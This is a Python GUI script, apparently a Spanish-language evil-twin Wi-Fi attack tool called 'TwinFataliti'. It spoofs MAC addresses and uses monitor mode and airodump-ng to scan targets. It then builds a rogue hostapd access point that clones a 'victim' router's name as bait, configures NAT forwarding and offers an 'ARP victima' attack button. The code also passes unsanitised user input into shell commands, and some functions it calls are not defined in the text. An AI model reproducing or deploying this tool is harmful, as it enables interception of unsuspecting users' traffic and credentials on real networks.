#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ LIBRERIAS ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
import tkinter as tk
from tkinter import *
from tkinter import messagebox as MessageBox
import time
import sys
import os
import subprocess 
from subprocess import Popen, PIPE, STDOUT
from io import open
import threading
import multiprocessing
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ CREADOR CODE INFORMACION ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
# Programador David soto noche
# Correo: Sotodelanoche@gmail.com
# Lenguaje Python3 scrispt 
# Fecha 08:05:2021:
# Nombre del programa : TwinFataliti
# Accion Acceso configuracion punto wifi mas servidor con apache2 html5 css3 y php 
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ FUNCION LOGO TERMINAL ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
os.system('clear')
os.system('python3 /root/wpa2/usr/imagen/img2txt/img2txt.py /root/wpa2/usr/imagen/logo.jpeg --ansi --maxLen=60 --targetAspect=0,1 --color')
print("\033[1;31;1m ")
os.system('figlet .FaKe PoiNt.')
print("				Smp_A")
print("\033[1;37;1m ")
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ FUNCION CONFIG ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ SELEC SELECION WIFI 0 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
def wlan0():
	global wlan0
	os.system("ifconfig")
	wlan0=input("Introduzca Wlan: ")
	if(wlan0=="wlan0mon"):
		wlan0=wlan0
	else:
		print("Procesando")
		os.system('ifconfig '+wlan0+' down')
		time.sleep(1)
		os.system('macchanger -A '+wlan0)
		time.sleep(1)
		os.system('ifconfig '+wlan0+' up') 
		time.sleep(1)
		os.system('airmon-ng check kill')
		time.sleep(1)
		os.system('airmon-ng start '+wlan0)
		time.sleep(1)
		os.system('airmon-ng check '+wlan0)
		time.sleep(1)
		wlan0=(wlan0+"mon")
		print(wlan0)	
		return wlan0
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ SELEC SELECION WIFI 1 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
def wlan1():
	global wlan1 
	os.system("ifconfig")
	wlan1=input("Introduzca Wlan: ")
	if(wlan1=="wlan1mon"):
		wlan1=wlan1
	else:
		print("Procesando")
		os.system('ifconfig '+wlan1+' down')
		time.sleep(1)
		os.system('macchanger -A '+wlan1)
		time.sleep(1)
		os.system('ifconfig '+wlan1+' up') 
		time.sleep(1)
		os.system('airmon-ng check kill')
		time.sleep(1)
		os.system('airmon-ng start '+wlan1)
		time.sleep(1)
		os.system('airmon-ng check '+wlan1)
		time.sleep(1)
		wlan1=(wlan1+"mon")
		print(wlan1)	
		return wlan1
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ SELEC SELECION WIFI -1 END ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ETH0 CONFIG NET ETH0 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
def eth0_config():
	global eth0
	eth0="eth0"
	print(eth0)
	print("Config eth0 Changer mac")
	print("Procesando")
	os.system('ifconfig '+eth0+' down')
	os.system('macchanger -A '+eth0)
	os.system('ifconfig '+eth0+' up')
	print(eth0)
	return eth0	
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ SELEC WIFI0MON  OFF ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
def off_0mon():
	while True:
		try:
			print("Config wlan0 NetworkManager")
			print("Procesando")
			os.system('airmon-ng stop wlan0mon')
			os.system('ifconfig wlan0 down')
			os.system('iwconfig wlan0 mode managed')
			os.system('ifconfig wlan0 up')
			os.system('service NetworkManager start')
			print("MoDo MG wLaN--0")
			break
		except TypeError:
			MessageBox.showerror("Error", "Ha ocurrido un error inesperado.")
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ SELEC WIFI1MON  OFF ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
def off_1mon():
	while True:
		try:
			print("Config wlan1 NetworkManager")
			print("Procesando")	
			os.system('airmon-ng stop wlan1mon')
			os.system('ifconfig wlan1 down')
			os.system('iwconfig wlan1 mode managed')
			os.system('ifconfig wlan1 up')
			os.system('service NetworkManager start')
			print("MoDo MG wLaN--1")
			break
		except TypeError:
			MessageBox.showerror("Error", "Ha ocurrido un error inesperado.")
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ SELEC eth0  OFF ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
def eth0(eth0):
	while True:
		try:
			print("Config eth0 NetworkManager")
			print("Procesando")	
			os.system('airmon-ng stop wlan1mon')
			os.system('ifconfig '+eth0mon+' down')
			os.system('iwconfig '+eth0mon+' mode managed')
			os.system('ifconfig '+eth0+' up')
			os.system('service NetworkManager start')
			print("MoDo MG wLaN--1"+eth0)
			break
		except TypeError:
			MessageBox.showerror("Error", "Ha ocurrido un error inesperado.")
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ LOOK WIFI TRAGET NO AIRDOMUN ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
def nmcli():
	wlan0
	ps0=threading.Thread(target=sca , args=())
	ps0.start()
def sca(**datos):
	process0=Popen(['x-terminal-emulator', '-e','nmcli', '-w', '2', 'device wifi list'], stdout=PIPE, stderr=PIPE, shell=False)
	stdout, stderr = process0.communicate()	
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ LOOK WIFI TRAGET SI AIRDOMUN ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
def airodump():
	print(wlan0)
	ps1=threading.Thread(target=scan1 , args=(wlan0,))
	ps1.start()

def scan1(wlan0, **datos):		
	process=Popen(['x-terminal-emulator', '-e', 'airodump-ng', '-i', wlan0, '--wps', '--manufacturer', '-a', '-w', '/root/wpa2/usr/captura-wifi/', '--output-format csv'], stdout=PIPE, stderr=PIPE, shell=False)
	stdout, stderr = process.communicate()
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ VENTANA INFO ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
def Info():
	os.system('clear')
	os.system('python3 /root/herramientas/wifi/wifi_point/img2txt/img2txt.py /root/herramientas/wifi/wifi_point/logo.jpeg --ansi --maxLen=60 --targetAspect=0,1 --color')
	print("\033[1;31;1m ")
	os.system('figlet .FaKe PoiNt.')
	print("				Smp_A")
	print("\033[1;37;1m ")
	MessageBox.showinfo(title="Info Creation", message="creador Smp_A \n fecha 13/05/2021 \n name wifi_point_fake")
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ VENTANA WIFI ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
def interfaz():

	root=tk.Tk()
	root.title("Smap_A TwinFataliti")
	img = PhotoImage(file='/root/wpa2/usr/imagen/ico/3.gif') #icono
	root.tk.call('wm', 'iconphoto', root._w, img)
	root.resizable(0,0)
	root.geometry("800x150")
	root.columnconfigure(15, weight=1)
	root.rowconfigure(15, weight=1)
	ox,oy=root.winfo_screenwidth()/2,root.winfo_screenheight()/2
	pht2= PhotoImage(file="/root/wpa2/usr/imagen/interfaz1.gif") #foto fondo
	lblImagen2=Label(root,image=pht2).place(x=1,y=1)

	menu = Menu(root)
	root.config(menu=menu)
	powermenu = Menu(menu, tearoff=0)
	wlanmenu = Menu(menu, tearoff=0)
	ayuda = Menu(menu, tearoff=0)
	menu.add_cascade(label="Power", menu=powermenu)
	menu.add_cascade(label="Wlan", 	menu=wlanmenu)
	menu.add_cascade(label="ayuda", menu=ayuda)
	wlanmenu.add_command(label="airodump", command=airodump)
	wlanmenu.add_command(label="nmcli", command=nmcli)
	wlanmenu.add_command(label="Wlan0", command=wlan0)
	wlanmenu.add_command(label="Wlan1", command=wlan1)
	wlanmenu.add_command(label="eth0", command=eth0_config)
	wlanmenu.add_command(label="Off 0Mon", command=off_0mon)
	wlanmenu.add_command(label="Off 1Mon", command=off_1mon)
	ayuda.add_command(label="Creation", command=Info)
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ VENTANA WIFI END~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ VARIABLES ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&& 
	global BSSID
	global channel
	global banda
	global ip_pc
	global name_route_victima
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ VENTANA WIFI ENTER DATE ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
	BSSID = tk.Entry(root, width=12 )
	BSSID.grid(row=1, column=0, ipadx=0, ipady=1, padx=0, pady=0)
	lb_BSSID = tk.Label(root, text="name BSSID", width=12,bg="deep sky blue").grid(padx=1, pady=0, row=1, column=1,sticky=W)

	channel = tk.Entry(root, width=2 )
	channel.grid(row=2, column=0, ipadx=0, ipady=1, padx=0, pady=0)
	lb_channel  = tk.Label(root, text="channel",width=12,bg="deep sky blue").grid(padx=1, pady=1, row=2, column=1,sticky=W)
	
	banda= tk.Entry(root, width=2 )
	banda.grid(row=3, column=0, ipadx=0, ipady=1, padx=0, pady=0)
	lb_banda= tk.Label(root, text="Banda",width=12,bg="deep sky blue").grid(padx=1, pady=1, row=3, column=1,sticky=W)

	ip_pc = tk.Entry(root, width=12)
	ip_pc.grid(row=4, column=0, ipadx=0, ipady=1, padx=0, pady=0)
	lb_ip_pc = tk.Label(root, text="ip_pc", width=12, bg="deep sky blue").grid(padx=1, pady=1, row=4, column=1,sticky=W)

	name_route_victima = tk.Entry(root, width=12)
	name_route_victima.grid(row=5, column=0, ipadx=0, ipady=1, padx=0, pady=0)
	lb_name_route_victima = tk.Label(root, text="Name router victima", width=19, bg="deep sky blue").grid(padx=1, pady=1, row=5, column=1,sticky=W)

#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&& 
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ VENTANA WIFI BOTON ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
	bttn1 = tk.Button(root, text='1-conf hostapd', font=("Roboto Cn",10), height=0, width=12, command=configurar_hostapd)
	bttn1.grid(row=3, column=3, ipadx=0, ipady=1, padx=0, pady=0)
	bttn1["bg"] = "deep sky blue" 
	bttn1["fg"] = "red" 
	
	bttn2 = tk.Button(root, text='2-conf dnsmasq', font=("Roboto Cn",10), height=0, width=12, command=configurar_dnsmasq)  
	bttn2.grid(row=3, column=4, ipadx=0, ipady=1, padx=0, pady=0) 
	bttn2["bg"] = "deep sky blue" 
	bttn2["fg"] = "red" 

	bttn3 = tk.Button(root, text='3-conf iptables', font=("Roboto Cn",10), height=0, width=12, command=config_route_tables)
	bttn3.grid(row=3, column=5, ipadx=0, ipady=1, padx=0, pady=0)
	bttn3["bg"] = "deep sky blue" 
	bttn3["fg"] = "red" 

	bttn4 = tk.Button(root, text='4-conf.Apache', font=("Roboto Cn",10), height=0, width=12, command= server_apache)
	bttn4.grid(row=3, column=6, ipadx=0, ipady=1, padx=0, pady=0)
	bttn4["bg"] = "deep sky blue" 
	bttn4["fg"] = "red"
	
	bttn5 = tk.Button(root, text='5-ARP victima', font=("Roboto Cn",10), height=0, width=12, command= lambda:[attack(), look()])
	bttn5.grid(row=4, column=5, ipadx=0, ipady=1, padx=0, pady=0)
	bttn5["bg"] = "deep sky blue" 
	bttn5["fg"] = "red" 
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ BOTONES VENTANA END ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&

#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ FUNCICONNES ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ config_route_tables  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
def config_route_tables():
	print(wlan0)
	print(wlan1)
	ip=(ip_pc.get())
	print(ip)
	conf_net_in=""
	
	if(wlan1=="wlan1mon"):
		conf_net_in=conf_net_in
	
	if(conf_net_in=="eth0"):       # preguntar por interfaz input wlan1 o eth0
		conf_net_in=conf_net_in

	print(conf_net_in)
	while True:
		try:
			time.sleep(0.8)
			print("#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$")
			print("#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ config_route_iptables  ")
			print("&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&")
			print("Config iptables & router")
			print("Procesando")
			time.sleep(0.3)
			os.system('iptables-save > /root/wpa2/usr/configuracion_tu_pc/dsl.fw')	
			time.sleep(0.3)
			os.system('ifconfig '+wlan0+' up '+ip+' netmask 255.255.255.0')# creacion de asociacion de ip wlan0
			time.sleep(0.3)
			os.system('ip route add '+ip+' via 192.168.1.1 dev '+wlan0)#ruting config
			time.sleep(0.3)
			os.system('iptables --table nat --append POSTROUTING --out-interface '+conf_net_in+' -j MASQUERADE') # elige una wifi o eth0 conf_net_in
			time.sleep(0.3)
			os.system('iptables --append FORWARD --in-interface '+wlan0+' -j ACCEPT')
			time.sleep(0.3)
			os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
			time.sleep(0.3)																# futuro variables rango de ip		
			os.system('iptables -t nat -L')
			time.sleep(0.3)
			print("configiracion iptable & ruting ok")
			print("#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$")
			print("#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ config_route_iptables  ")
			print("&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&")			
			time.sleep(0.8)
			break
		except TypeError:
			MessageBox.showerror("Error", "Ha ocurrido un error inesperado.")
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ config_hostpad ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
def configurar_hostapd():
	print(wlan0)
	Banda=(banda.get())
	Channel=(channel.get())	
	name_route_victima_anzuelo=(name_route_victima.get())
	print(Banda)
	print(Channel)
	print(name_route_victima_anzuelo)	
	print("Config hostapd.conf")
	print("Procesando")
	os.system("touch /root/wpa2/usr/configuracion_dns_host_conf/hostapd.conf")
	file1 = open("/root/wpa2/usr/configuracion_dns_host_conf/hostapd.conf","w")
	file1.write('interface='+wlan0+'\n') 
	file1.write('driver=nl80211'+'\n')
	file1.write('ssid='+name_route_victima_anzuelo+'\n')
	file1.write('hw_mode='+Banda+'\n')
	file1.write('channel='+Channel+'\n')
	file1.write('macaddr_acl=0'+'\n') # colocar seguridad wpa2 simple 
	file1.write('auth_algs=1'+'\n')
	file1.write('ignore_broadcast_ssid=0'+'\n')
	file1.close()
	time.sleep(1)
	print("ejecutando hostapd.conf y ejecutando hostapd")

	conf1=threading.Thread(target=hostapd_go, args=())
	conf1.start()

def hostapd_go(**datos):
	while True:
		try:
			proceso1=Popen(['x-terminal-emulator', '-e', 'hostapd /root/wpa2/usr/configuracion_dns_host_conf/hostapd.conf'], stdout=PIPE, stderr=PIPE) 
			stdout, stderr=proceso1.communicate()	
			break
		except TypeError:
			MessageBox.showerror("Error", "Ha ocurrido un error inesperado.")
